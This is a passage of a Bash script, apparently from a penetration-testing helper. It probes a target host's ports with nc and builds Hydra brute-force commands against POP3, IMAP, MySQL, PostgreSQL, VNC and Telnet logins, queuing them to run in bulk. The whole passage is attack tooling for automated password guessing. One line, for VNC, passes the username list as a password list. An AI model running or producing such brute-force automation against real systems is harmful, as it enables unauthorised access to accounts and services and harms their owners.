        echo -e "${GREEN}>> hydra -L $HYDRA_USERS -e nsr -t 4 pop3://$first_target${NC}"
        shown_any=true
    fi
    
    # Check IMAP (port 143)
    if [[ -s "$OUTDIR/targets_imap.txt" ]]; then
        echo -e "${GREEN}>> hydra -L $HYDRA_USERS -e nsr -t 4 imap://$first_target${NC}"
        shown_any=true
    fi
    
    # Check MySQL (port 3306)
    if nc -z -w2 "$first_target" 3306 2>/dev/null; then
    queue_phase_cmd "hydra -L $HYDRA_USERS -e nsr -t 4 mysql://$first_target"
        shown_any=true
    fi
    
    # Check PostgreSQL (port 5432)
    if nc -z -w2 "$first_target" 5432 2>/dev/null; then
    queue_phase_cmd "hydra -L $HYDRA_USERS -e nsr -t 4 postgres://$first_target"
        shown_any=true
    fi
    
    # Check VNC (port 5900)
    if [[ -s "$OUTDIR/targets_vnc.txt" ]]; then
    queue_phase_cmd "hydra -P $HYDRA_USERS -e nsr -t 4 vnc://$first_target"
        shown_any=true
    fi
    
    # Check Telnet (port 23)
    if nc -z -w2 "$first_target" 23 2>/dev/null; then
    queue_phase_cmd "hydra -L $HYDRA_USERS -e nsr -t 4 telnet://$first_target"
        shown_any=true
    fi
    
    if [[ "$shown_any" == false ]]; then
        echo -e "${YELLOW}    (no supported hydra services open)${NC}"
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Run all: bash $HYDRA_CMDS${NC}"
}
